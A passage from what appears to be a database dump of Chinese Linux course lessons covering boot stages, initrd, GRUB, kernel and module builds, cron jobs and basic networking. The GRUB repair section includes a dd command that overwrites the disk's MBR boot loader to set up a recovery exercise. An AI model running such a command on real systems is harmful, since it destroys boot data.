loader(即是grub,spfdisk等程序)<br>3.依据boot loader的设置加载kernel，kernel会开始检测硬件与加载驱动程序<br>4.在硬件驱动成功后，Kernel会主动调用init进程，而init会取得run-level信息<br>5.init执行/etc/rc.d/rc.sysinit文件来准备软件执行的操作环境(如网络、时区等)<br>6.init执行run-level的各个服务的启动(script方式)<br>7.init执行/etc/rc.d/rc.local文件<br>8.init执行终端机模拟程序mingetty来启动login进程，最后就等待用户登录<br><br></p><dl><dt>boot loader的功能</dt><dd><span>boot loader的功能</span><br><span>1.提供菜单：用户可以选择不同的启动选项，这也是多重引导的重要功能<br>2.加载内核文件：直接指向可启动的程序区段来开始操作系统<br>3.转交给其他loader：将引导装载功能转交给其他loader负责<br><br></span></dd><dt>initrd</dt><dd><span>/boot/initrd<br><br></span>==============================================================================<span><br><br>虚拟文件系统(Initial RAM Disk)在启动过程中的作用<br><br></span><span>Linux在启动过程中，内核要动态加载内核模块，内核模块放置在/lib目录下，因此启动过程中必须<br>要挂载根目录，才能读取内核模块提供加载驱动程序的功能，为了防止影响到磁盘内的文件系统，一次启<br>动过程中根目录是以只读方式挂载的。<br><br>USB，SATA，SCSI等磁盘设备的驱动程序通常是以模块的方式存在的，如果linux安装在这些设备<br>上，启动时BIOS会通过INT13取得boot loader和kernel文件进行启动，之后kernel会接管系统检<br>测硬件，挂载linux所在文件系统并获取额外的驱动。<br><br>在kernel接管系统时没有加载系统所在磁盘的驱动程序，因此无法识别文件系统，需要加载<br>/lib/modules中的模块，问题是kernel连根目录都识别不了，根本无法加载/lib/modules<br>中的磁盘驱动程序模块。<br><br>虚拟文件系统(Initial RAM Disk)，一般使用的文件名是/boot/initrd,在启动过程中<br>会被boot loader加载到内存中，并在内存中解压缩在内存中仿真成一个根目录，并且此仿真在<br>内存中的文件系统能够提供一个可执行的程序，kernel通过该程序来加载启动过程中最需要的内<br>核模块，通常这些模块就是USB，RAID，LVM，SCSI等文件系统于磁盘接口的驱动程序。等所需<br>模块载入完成后，内核会重新调用/sbin/init来开始后续的正常启动<br><br></span>================================================================================<span><br></span><br><span>1. 释放initrd</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>mkdir newinitrd</span><br>[root@station230 ~]#<span>&nbsp;</span><span>cp /boot/initrd-2.6.18-308.el5.img newinitrd/</span><br>[root@station230 ~]#<span>&nbsp;</span><span>cd newinitrd/</span><br>[root@station230 newinitrd]#<span>&nbsp;</span><span>gunzip -c initrd-2.6.18-308.el5.img |cpio -id</span><br>11709 blocks<br><span><br></span>[root@station230 ~]#<span>&nbsp;</span><span>ls newinitrd/</span><br>bin dev etc init initrd-2.6.18-308.el5PAE.img lib proc sbin sys sysroot<br><br><span>2. 创建initrd</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>mkinitrd -v --with=8139too aaa-$(uname -r).img $(uname -r)</span><br>[root@station230 ~]#<span>&nbsp;</span><span>ls aaa-2.6.18-308.el5.img</span><span>&nbsp;</span><br>aaa-2.6.18-308.el5.img<br></dd><dt>GRUB</dt><dd><span>GRUB</span><br><br>===========================================================<br><br><span>与启动时grub菜单有关的配置文件/boot/grub/grub.conf</span><br><br>vim /boot/grub/grub.conf<br><br><span>default=1<br>timeout=5<br>splashimage=(hd0,0)/grub/splash.xpm.gz<br>hiddenmenu<br>title Red Hat Enterprise Linux Server (2.6.32.3)<br>kernel (hd0,0)/vmlinuz-2.6.32.3 ro root=LABEL=/ rhgb quiet<br>initrd (hd0,0)/initrd-2.6.32.3.img<br>title Red Hat Enterprise Linux Server (2.6.18-308.el5)<br>root (hd0,0)<br>kernel /vmlinuz-2.6.18-308.el5 ro root=LABEL=/ rhgb quiet<br>initrd /initrd-2.6.18-308.el5.img<br></span><dl><dt>GRUB菜单加密</dt><dd><span>GRUB菜单加密<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>grub-md5-crypt</span><br>[root@station230 ~]#<span>&nbsp;</span><span>vim /etc/grub.conf<br></span><br><span>default=0<br>timeout=3</span><br><span>password --md5 $1$6Gvtp0$tAhUeGsinlXoTvm4coBLI1</span><br><span>title uplooking linux<br>root (hd0,0)<br>kernel /vmlinuz-2.6.18-308.el5 ro root=/dev/hdc3<br>initrd /initrd-2.6.18-308.el5.img<br><br><br>title Red Hat Enterprise Linux Server (2.6.18-308.el5)<br>root (hd0,0)<br>kernel /vmlinuz-2.6.18-308.el5 ro root=LABEL=/ rhgb quiet<br>initrd /initrd-2.6.18-308.el5.img<br>initrd /aaa-2.6.18-308.el5.img	//自已创建的initrd<br></span><br><br><br></dd><dt>GRUB修复</dt><dd><br>============================================================================<br><br><span>grub.conf文件丢失或损坏的手动引导方法</span><br><br>重启后会进入grub界面<br><br><span>1.root (hd0,x)<span>&nbsp;</span></span>#x为内核文件所在分区，一般为单独的/boot分区	<br><span>2.kernel /vmlinuz-2.6.18-308.el5 ro root=/dev/hdc3<span>&nbsp;</span></span>#此处的root为真实的根分区	<span><br>3.initrd /initrd-2.6.18-308.el5.img</span><br><span>4.boot	</span>#手动引导<span><br><br></span>=============================================================================<span><br></span><br><span>MBR中的boot loader(grub)破坏的修复方法<br></span><br><span>dd if=/dev/zero of=/dev/hdc bs=1 count=446</span>	//破坏MBR boot loader<br><br><span>修复方法：</span><br><br><span>1. 从光盘进入救援模式 linux rescue<br>2. 不加载网络<br>3. chroot /mnt/sysimage //切换到真实根目录(救援模式真实根目录会被挂载到/mnt/sysimage)<br>4. df,fdisk -ul	//找到包含grub的分区，比如/dev/sda1<br>5. grub<br>&gt; root (hd0,0)	//指定grub所在的分区<br>&gt; setup (hd0)	//安装grub主程序到MBR boot loader<br>&gt; quit<br>6. reboot</span></dd></dl></dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:14:25',1,NULL,'',0,''),(71,'linux基础课程训练十','linux内核模块编译方面的命令','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>kernel相关的概念<br><br>双树结构<br><br>内核体系结构：<br>1. 微内核体系结构<br>2. 单内核体系结构<br></p><dl><dt>内核编译</dt><dd><span>编译内核<br><br></span>================================================================<span><br></span><br><span>一、编译内核目的</span><span><br><br>追求前瞻性<br>开发测试之用<br>增加新功能<br>使用新的硬件驱动<br>原来的内核太过臃肿<br>其他需求（例如嵌入式开发）</span><br><br>================================================================<br><br><span>二、内核编译具体实施的步骤</span><span><br></span><br><span>1. 安装编译内核所需要的工具 gcc lib make (开发工具 开发库)<br>2. 下载内核(源码)<br>a. www.kernel.org (最新)<br>b. ftp://ftp.redhat.com/pub/redhat/linux/enterprise/5Server<br>ftp://ftp.redhat.com/pub/redhat/linux/enterprise/6Server<br>3. 解压缩linux-2.6.39.tar.gz (/usr/src)<br>4. 配置内核编译的参数 make menuconfig (类似./configure --)<br>5. 开始编译make (代替make bzImage make modules)<br>6. 安装模块make modules_install<br>7. 安装内核make install<br>8. ls /boot<br>9. /boot/grub/grub.conf</span><br><br>===================================================================<br><br><span>三、编译内核 step-by-step</span><span><br></span><br><span>1.</span><span>&nbsp;</span>make gcc gcc-c++ ncurses-devel和库工具 (建议安装开发工具和开发库组)<br>[root@station230 ~]#<span>&nbsp;</span><span>yum grouplist</span><br>[root@station230 ~]#<span>&nbsp;</span><span>yum -y groupinstall \"开发工具\" \"开发库\"</span><br><br><span>2.</span>下载内核<br><br><span>3.</span>[root@station230 kernel]#<span>&nbsp;</span><span>tar xvf linux-2.6.39.tar.gz -C /usr/src/</span><br>[root@station230 ~]#<span>&nbsp;</span><span>cd /usr/src/linux-2.6.39/</span><br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>ls</span><br>arch Documentation init lib README sound<br>block drivers ipc MAINTAINERS REPORTING-BUGS tools<br>COPYING firmware Kbuild Makefile samples usr<br>CREDITS fs Kconfig mm scripts virt<br>crypto include kernel net security<br><br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>make mrproper</span><span>&nbsp;</span>清理代码树 (*.o *.ko)<br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>make menuconfig</span><br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>make</span><br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>make modules_install</span><br>[root@station230 linux-2.6.39]#<span>&nbsp;</span><span>make install</span><br><br>========================================<br><br><span>四、生成新的initrd<br></span><br>[root@station230 boot]#<span>&nbsp;</span><span>mkdir /newdir</span><br>[root@station230 boot]#<span>&nbsp;</span><span>cp initrd-2.6.32.3.img /newdir/<br></span>[root@station230 boot]#<span><span>&nbsp;</span>cd /newdir</span><br>[root@station230 newdir]#<span>&nbsp;</span><span>gunzip -c initrd-2.6.32.3.img |cpio -id</span><br>[root@station230 newdir]#<span>&nbsp;</span><span>rm -rf initrd-2.6.32.3.img</span><br>[root@station230 newdir]#<span>&nbsp;</span><span>vim init</span><br>mkrootdev -t ext3 -o defaults,ro /dev/hdc3 /sysroot<br>#setuproot<br>[root@station230 newdir]#<span>&nbsp;</span><span>find . |cpio --quiet -c -o &gt; /initrd-2.6.32.3-1</span><br>[root@station230 /]#<span>&nbsp;</span><span>gzip -9 initrd-2.6.32.3-1<span>&nbsp;</span></span><br>[root@station230 /]#<span>&nbsp;</span><span>mv initrd-2.6.32.3-1.gz initrd-2.6.32.3-1.img</span><br>[root@station230 /]#<span>&nbsp;</span><span>mv initrd-2.6.32.3-1.img /boot/<br></span><br><span>vim /etc/grub.conf<br></span><br>title Red Hat Enterprise Linux Server (2.6.32.3)<br>kernel (hd0,0)/vmlinuz-2.6.32.3 ro root=LABEL=/ rhgb quiet<br>initrd (hd0,0)/initrd-2.6.32.3-1.img<br><br><br><br><br></dd><dt>模块编译</dt><dd><span>编译模块</span><br><br>==================================================================================<br><br><span>获得与当前内核匹配版本：</span><br>ftp://ftp.redhat.com/pub/redhat/linux/enterprise/5Server<br>ftp://ftp.redhat.com/pub/redhat/linux/enterprise/6Server<br><span>当前内核版本：</span><br>[root@station230 ~]#<span>&nbsp;</span><span>uname -r</span><br>2.6.18-308.el5<br><span>下载的内核：</span><br>kernel-2.6.18-308.el5.src.rpm //rpm-build包支持<br><span>需要的工具 rpm-build，开发工具，开发库</span><br>[root@station230 ~]#<span>&nbsp;</span><span>rpm -q rpm-build</span><br>rpm-build-4.4.2.3-27.el5<br><br>===================================================================================<br><br><span>编译内核模块<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /usr/src/redhat/</span><br>BUILD RPMS SOURCES SPECS SRPMS<br><br>[root@station230 ~]#<span>&nbsp;</span><span>rpm -ivh /var/ftp/pub/kernel/kernel-2.6.18-308.el5.src.rpm</span><br>[root@station230 redhat]#<span>&nbsp;</span><span>ls BUILD/</span><br>[root@station230 redhat]#<span>&nbsp;</span><span>rpmbuild -bp --target=$(uname -m) SPECS/kernel.spec</span><br>[root@station230 redhat]#<span>&nbsp;</span><span>cd BUILD/kernel-2.6.18/linux-2.6.18-308.el5.i686/</span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>ls</span><br>arch CREDITS fs Kbuild Makefile REPORTING-BUGS sound<br>block crypto include kernel mm samples tools<br>configs Documentation init lib net scripts usr<br>COPYING drivers ipc MAINTAINERS README security<br><br>[root@station230 redhat]#<span>&nbsp;</span><span>make menuconfig	#勾选jfs和xfs模块</span><br>[root@station230 redhat]#<span>&nbsp;</span><span>mkdir .tmp_versions<span>&nbsp;</span></span><br><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>make fs/jfs/jfs.ko</span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>make fs/xfs/xfs.ko<br></span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>ls fs/jfs/jfs.ko<span>&nbsp;</span></span><br>fs/jfs/jfs.ko<br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>ls fs/xfs/xfs.ko<span>&nbsp;</span></span><br>fs/xfs/xfs.ko<br><br>===============================================================================================<br><br><span>复制模块到当前内核模块目录<br></span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>ls /lib/modules/2.6.18-308.el5/kernel/fs/</span><br>autofs4 cramfs ext3 fscache hfsplus lockd nfsd vfat<br>cachefiles dlm ext4 fuse jbd msdos nls<br>cifs ecryptfs fat gfs2 jbd2 nfs squashfs<br>configfs exportfs freevxfs hfs jffs2 nfs_common udf<br><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>mkdir /lib/modules/2.6.18-308.el5/kernel/fs/{jfs,xfs}</span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>cp fs/jfs/jfs.ko /lib/modules/2.6.18-308.el5/kernel/fs/jfs/</span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>cp fs/xfs/xfs.ko /lib/modules/2.6.18-308.el5/kernel/fs/xfs/</span><br><br>===================================================================================================<br><br><span>重新生成模块的依赖关系<br></span><br>[root@station230 linux-2.6.18-308.el5.i686]#<span>&nbsp;</span><span>cd /lib/modules/2.6.18-308.el5/</span><br>[root@station230 2.6.18-308.el5]#<span>&nbsp;</span><span>ls</span><br>build modules.alias modules.inputmap modules.seriomap updates<br>extra modules.ccwmap modules.isapnpmap modules.symbols weak-updates<br>kernel modules.dep modules.ofmap modules.usbmap<br>misc modules.ieee1394map modules.pcimap source<br>[root@station230 2.6.18-308.el5]#<span>&nbsp;</span><span>depmod</span><span>&nbsp;</span>//更新依赖性关系<br><br>=====================================================================================================<br><br><span>加载并查看模块<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe jfs	</span>//加载模块<br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe xfs</span><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep jfs</span>	//查看模块<br>jfs 149228 0<span>&nbsp;</span><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep xfs</span><br>xfs 430148 0<span>&nbsp;</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>modinfo jfs</span>	//查看模块的详细信息<br>filename: /lib/modules/2.6.18-308.el5/kernel/fs/jfs/jfs.ko<br>license: GPL<br>author: Steve Best/Dave Kleikamp/Barry Arndt, IBM<br>description: The Journaled Filesystem (JFS)<br>srcversion: C1FE22C988C028FFD4932DB<br>depends:<span>&nbsp;</span><br>vermagic: 2.6.18-prep SMP mod_unload 686 REGPARM 4KSTACKS gcc-4.1<br>parm: nTxBlock:Number of transaction blocks (max:65536) (int)<br>parm: nTxLock:Number of transaction locks (max:65536) (int)<br>parm: commit_threads:Number of commit threads (int)<br><br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe -r jfs</span>	//移出模块<br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe -r xfs</span><br><br>=====================================================================================<br><br><span>安装创建ext4和jfs文件系统的工具</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>yum provides */mkfs.ext4</span><br>Loaded plugins: katello, product-id, security, subscription-manager<br>Updating certificate-based repositories.<br>Unable to read consumer identity<br>Cluster | 1.5 kB 00:00<span>&nbsp;</span><br>ClusterStorage | 1.5 kB 00:00<span>&nbsp;</span><br>Server | 1.5 kB 00:00<span>&nbsp;</span><br>VT | 1.3 kB 00:00<span>&nbsp;</span><br>Cluster/filelists | 116 kB 00:00<span>&nbsp;</span><br>ClusterStorage/filelists | 13 kB 00:00<span>&nbsp;</span><br>Server/filelists | 2.4 MB 00:01<span>&nbsp;</span><br>VT/filelists | 38 kB 00:00<span>&nbsp;</span><br>soft/filelists | 885 B 00:00<span>&nbsp;</span><br>e4fsprogs-1.41.12-2.el5.i386 : Utilities for managing the fourth extended (ext4)<br>: filesystem<br>Repo : Server<br>Matched from:<br>Filename : /sbin/mkfs.ext4<br><br>[root@station230 ~]#<span>&nbsp;</span><span>yum -y install e4fsprogs</span>	//创建ext4文件系统的工具<br>[root@station230 ~]#<span>&nbsp;</span><span>mkfs.ext4 /dev/hdc13</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mkdir /mnt/dir4</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mount /dev/hdc13 /mnt/dir4</span><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep ext4</span><br>ext4 254557 1<span>&nbsp;</span><br>jbd2 60325 1 ext4<br>crc16 6209 1 ext4<br><br>[root@station230 kernel]#<span>&nbsp;</span><span>cd jfsutils-1.1.15</span><br>[root@station230 jfsutils-1.1.15]#<span>&nbsp;</span><span>ls</span><br>aclocal.m4 configure fsck install-sh logdump mkfs xpeek<br>AUTHORS configure.in fscklog jfsutils.spec Makefile.am NEWS<br>ChangeLog COPYING include jfsutils.spec.in Makefile.in README<br>config.h.in depcomp INSTALL libfs missing tune<br><br>[root@station230 jfsutils-1.1.15]#<span>&nbsp;</span><span>./configure &amp;&amp; make &amp;&amp; make install</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mkfs.jfs /dev/hdc14</span>	//创建jfs文件系统<br>mkfs.jfs version 1.1.15, 04-Mar-2011<br>Warning! All data on device /dev/hdc14 will be lost!<br><br>Continue? (Y/N) y<br><br>Format completed successfully.<br>97898 kilobytes total disk space.<br><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep jfs</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mkdir /mnt/jfs</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mount /dev/hdc14 /mnt/jfs/</span><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep jfs</span><br>jfs 149228 1<br><br>[root@station230 ~]#<span>&nbsp;</span><span>cp /etc/passwd /mnt/dir4</span><br>[root@station230 ~]#<span><span>&nbsp;</span>cp /etc/passwd /mnt/jfs/</span><br><br>=======================================================================================<br><br><span>安装网卡驱动<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>ethtool -i eth0</span>	//查询eth0使用的模块（已经正常被驱动环境）<br>driver: 8139too<br>version: 0.9.27<br>firmware-version:<span>&nbsp;</span><br>bus-info: 0000:03:00.0<br><br><span>移动e1000和e1000e模块到其它目录后:</span><br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe e1000</span><br>FATAL: Could not open \'/lib/modules/2.6.18-308.el5/kernel/drivers/net/e1000/e1000.ko\': No such file or directory<br>[root@station230 ~]#<span>&nbsp;</span><span>depmod<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe e1000</span><br>FATAL: Module e1000 not found.<br><br><span>下载相应网卡的驱动:</span><br>[root@station230 kernel]#<span>&nbsp;</span><span>tar xvf e1000e-2.0.0.1.tar.gz</span>	//解压<br>[root@station230 kernel]#<span>&nbsp;</span><span>cd e1000e-2.0.0.1</span><br>[root@station230 e1000e-2.0.0.1]#<span>&nbsp;</span><span>vim README</span>	//查看帮助文档，得到如下安装方法<br><br>************************************************************************<br><br>2. Untar/unzip archive:<br><br>tar zxf e1000e-x.x.x.tar.gz<br><br>3. Change to the driver src directory:<br><br>cd e1000e-x.x.x/src/<br><br>4. Compile the driver module:<br><br># make install<br><br>The binary will be installed as:<br><br>/lib/modules/&lt;KERNEL VERSION&gt;/kernel/drivers/net/e1000e/e1000e.[k]o<br><br>**************************************************************************<br><br>[root@station230 e1000e-2.0.0.1]#<span>&nbsp;</span><span>cd src/</span><br>[root@station230 src]#<span>&nbsp;</span><span>ls</span><br>80003es2lan.c e1000.h kcompat.c Makefile nvm.c regs.h<br>80003es2lan.h ethtool.c kcompat_ethtool.c manage.c nvm.h<br>82571.c hw.h kcompat.h manage.h param.c<br>82571.h ich8lan.c mac.c Module.supported phy.c<br>defines.h ich8lan.h mac.h netdev.c phy.h<br><br>[root@station230 src]#<span>&nbsp;</span><span>make install</span><br>make -C /lib/modules/2.6.18-308.el5/build SUBDIRS=/var/ftp/pub/kernel/e1000e-2.0.0.1/src modules<br>make[1]: Entering directory `/usr/src/kernels/2.6.18-308.el5-i686\'<br>CC [M] /var/ftp/pub/kernel/e1000e-2.0.0.1/src/netdev.o<br>CC [M] /var/ftp/pub/kernel/e1000e-2.0.0.1/src/ethtool.o<br>CC [M] /var/ftp/pub/kernel/e1000e-2.0.0.1/src/param.o<br><br>[root@station230 src]#<span>&nbsp;</span><span>depmod<span>&nbsp;</span></span>//更新所有模块的依赖性关系<br>[root@station230 src]#<span>&nbsp;</span><span>modinfo e1000e</span>	//查看并加载模块测试<br>filename: /lib/modules/2.6.18-308.el5/kernel/drivers/net/ethernet/intel/e1000e/e1000e.ko<br>version: 2.0.0.1-NAPI<br>license: GPL<br>description: Intel(R) PRO/1000 Network Driver<br>author: Intel Corporation, &lt;linux.nics@intel.com&gt;<br>srcversion: 3072FB0985A1753E9BE36FB<br>alias: pci:v00008086d0000153Bsv*sd*bc*sc*i*<br><br>[root@station230 ~]#<span>&nbsp;</span><span>modprobe e1000e</span><br>[root@station230 ~]#<span>&nbsp;</span><span>lsmod |grep e1000e</span><br>e1000e 187736 0<span>&nbsp;</span><br>8021q 25929 2 e1000e,cxgb3</dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:15:40',1,NULL,'',0,''),(72,'linux基础课程训练十一','linux计划任务网络ssh方面的命令','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><dt>计划任务</dt><dd>cron 计划任务<br><br>==============================================================================<br><br>[root@localhost ~]#&nbsp;ps aux | grep --colour cron<br>root 2764 0.0 0.0 5632 1116 ? Ss 09:20 0:00 crond<br>root 2806 0.0 0.0 1764 604 ? SNs 09:20 0:00 anacron -s<br>root 4177 0.0 0.0 4260 700 pts/1 R+ 10:05 0:00 grep cron<br><br>[root@localhost ~]#&nbsp;chkconfig crond --list<br>crond 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭<br><br>[root@localhost ~]#&nbsp;chkconfig anacron --list<br>anacron 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭<br><br>[root@localhost ~]#&nbsp;/etc/init.d/crond status<br>crond (pid 2764) 正在运行...<br><br>cron进程每分钟检查一次，以运行任何计划任务<br><br>存放用户定义计划任务的目录/var/spool/cron<br>(以用户名作为文件名存储计划任务内容)<br><br>================================================================================<br><br>系统级的计划任务<br><br>如果没有crond<br>谁帮你更新whatis数据库 (man -k keyword)<br>日志文件会越来越大，没有人帮你切割<br>没有帮你更新locate数据库<br>清除/tmp,/var/tmp临时文件<br># run-parts<br><br>vim /etc/crontab<br><br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br>HOME=/<br><br># run-parts<br>01 * * * * root run-parts /etc/cron.hourly<br>02 4 * * * root run-parts /etc/cron.daily<br>22 4 * * 0 root run-parts /etc/cron.weekly<br>42 4 1 * * root run-parts /etc/cron.monthly<br><br>[root@localhost ~]#&nbsp;ls /etc/cron.hourly/<br>[root@localhost ~]#&nbsp;ls /etc/cron.daily/<br>0anacron cups makewhatis.cron prelink rpm<br>0logwatch logrotate mlocate.cron rhsmd tmpwatch<br>[root@localhost ~]#&nbsp;ls /etc/cron.weekly/<br>0anacron 99-raid-check makewhatis.cron<br>[root@localhost ~]#&nbsp;ls /etc/cron.daily<br>cron.d/ cron.deny cron.monthly/&nbsp;<br>cron.daily/ cron.hourly/ cron.weekly/&nbsp;<br>[root@localhost ~]#&nbsp;ls /etc/cron.monthly/<br>0anacron<br><br>=================================================================================<br><br>用户计划任务<br><br>[root@localhost ~]#&nbsp;crontab -e	//创建计划任务<br>[root@localhost ~]#&nbsp;crontab -l	//查看当前的计划任务<br><br>* * * * *<br>分	时	日	月	周<br>0-59	0-23	1-31	1-12	1-7	//0,7表示周日	<br><br>* * * * * 每分钟<br>*/5 * * * * 每5分钟<br>5 * * * * 每小时第5分钟<br>00 02 * * * 每天的2点<br>00 02 15 * * 每月15号的2点<br>00 02 10,15,20 * * 每月的10,15,20号2点<br>00 02 10-15 * * 每月的10-15号2点<br>00 02 10,15,20 01 * 每年1月10,15,20号2点<br>00 02 10,15,20 01 6,7 每年的1月10,15.20如果是周6或者周日 那2点执行<br><br>[root@localhost ~]#&nbsp;crontab -l<br>01 4 * * * /bin/echo \"test crond...\" &gt; /dev/pts/2&nbsp;<br><br>[root@localhost ~]#&nbsp;crontab -u alice -e<br>[root@localhost ~]#&nbsp;service crond restart<br>停止 crond： [确定]<br>启动 crond： [确定]<br><br>====================================================================================<br><br>anacron<br><br>vim /etc/anacrontab<br><br>1 65 cron.daily run-parts /etc/cron.daily<br>7 70 cron.weekly run-parts /etc/cron.weekly<br>30 75 cron.monthly run-parts /etc/cron.monthly<br><br>执行频率	延迟的时间 描述	<br><br>====================================================================================<br><br>每天备份/etc目录<br><br>[root@station40 ~]#&nbsp;vim /etc/anacrontab&nbsp;<br>[root@station40 ~]#&nbsp;which tar<br>/bin/tar<br>[root@station40 ~]#&nbsp;chmod a+x /back.sh&nbsp;<br>[root@localhost ~]#&nbsp;cat /back.sh&nbsp;<br>#!/bin/bash<br>/bin/tar -cf /root/`date +%F`-etc.tar /etc<br><br>[root@localhost ~]#&nbsp;service crond restart<br>停止 crond： [确定]<br>启动 crond： [确定]<br><br>====================================================================================<br><br>每10秒在/dev/pts/2输出: `date` test...<br><br>[root@station40 ~]#&nbsp;crontab -l<br>* * * * * echo \"`date` test...\" &gt; /dev/pts/2<br>* * * * * sleep 10; echo \"`date` test...\" &gt; /dev/pts/2<br>* * * * * sleep 20; echo \"`date` test...\" &gt; /dev/pts/2<br>* * * * * sleep 30; echo \"`date` test...\" &gt; /dev/pts/2<br>* * * * * sleep 40; echo \"`date` test...\" &gt; /dev/pts/2<br>* * * * * sleep 50; echo \"`date` test...\" &gt; /dev/pts/2<br><br>[root@station40 ~]#&nbsp;service crond restart<br>停止 crond： [确定]<br>启动 crond： [确定]<br><br>[root@station40 ~]#&nbsp;tty&nbsp;<br>/dev/pts/2<br>[root@station40 ~]# Sun Sep 23 00:01:01 CST 2012 test...<br>Sun Sep 23 00:01:11 CST 2012 test...<br>Sun Sep 23 00:01:21 CST 2012 test...<br>Sun Sep 23 00:01:31 CST 2012 test...<br>Sun Sep 23 00:01:41 CST 2012 test...<br>Sun Sep 23 00:01:51 CST 2012 test...<br>Sun Sep 23 00:02:01 CST 2012 test...<br>Sun Sep 23 00:02:11 CST 2012 test...<br>Sun Sep 23 00:02:21 CST 2012 test...<br>Sun Sep 23 00:02:31 CST 2012 test...<br>Sun Sep 23 00:02:41 CST 2012 test...<br><br>================================================================================<br><br>每天2:00备份/etc/目录，到/backup目录，只保留最近一周的备份(find)<br><br>[root@station40 ~]#&nbsp;cat /back.sh&nbsp;<br>#!/bin/bash<br>/bin/tar -cf /backup/`date +%F`-etc.tar /etc<br>find /backup -mtime +7 -exec rm -rf {} \\;<br><br>[root@station40 ~]#&nbsp;mkdir /backup<br><br>[root@station40 ~]#&nbsp;crontab -l<br>0 2 * * * /back.sh &amp;&gt;/dev/null<br><br>================================================================================<br><br>练习:<br><br>1.如果是3,5月的10到15号那2点10分 输出一个1到/tmp/aa.txt<br>10 02 10-15 3,5 *　/bin/echo　１　&gt;　/tmp/aa.txt<br><br>2.如果是10-12月 在1-10号如果是周日的话 那么在13点 15点 18点时 输出一个系统时间到/tmp/date.txt<br>00 13,15,18 1-10 10-12 7 /bin/echo `date` &gt; /tmp/date.txt<br><br>3.要求:在你当前系统时间的5分钟后备份你的/boot目录 以日期为名字 保存备份的目录为/backup<br>52 13 * * * /backup/back.sh<br><br>vim /backup/back.sh<br>#!/bin/bash<br>/bin/tar -zcvf /backup/`date +%F`-boot.tar.gz /boot 1&gt; /dev/null 2&gt; /bac<br>kup/err.log<br><br><br><br><br><br><br><br><br></dd><dt>网络基础</dt><dd>网络基础<br><br>网络接口名称：eth0,wlan0,virbr0,bond0<br><br>============================================================================<br><br>IP<br><br>[root@localhost ~]#&nbsp;ip addr<br>[root@localhost ~]#&nbsp;ip addr show eth0<br>[root@localhost ~]#&nbsp;ip addr add dev eth0 100.100.100.100<br>[root@localhost ~]#&nbsp;ip addr del dev eth0 100.100.100.100<br><br>IP 192.168.0.40/24	逻辑地址，门牌号<br>MAC e0:05:c5:ee:d2:14	物理地址，房子经纬度<br><br>[root@localhost ~]#&nbsp;ip route&nbsp;本机路由表<br>192.168.0.0/24 dev eth0 proto kernel scope link src 192.168.0.40&nbsp;<br>169.254.0.0/16 dev eth0 scope link&nbsp;<br><br>=============================================================================<br><br>ifconfig<br><br>激活/关闭网卡<br>ifconfig eth0 down<br>ifconfig eth0 up<br>ifup eth0<br>ifdown eth0<br><br>============================================================================<br><br>route<br><br>route -n&nbsp;查看本机路由表<br>route add default gw 192.168.0.254&nbsp;为本机添加临时默认网关<br>route del default gw 192.168.0.254&nbsp;删除本机默认网关<br>traceroute www.sina.com	查看数据包到达目标主机总共经过几跳<br><br>===========================================================================<br><br>打开路由转发功能的方法<br><br>1.echo 1 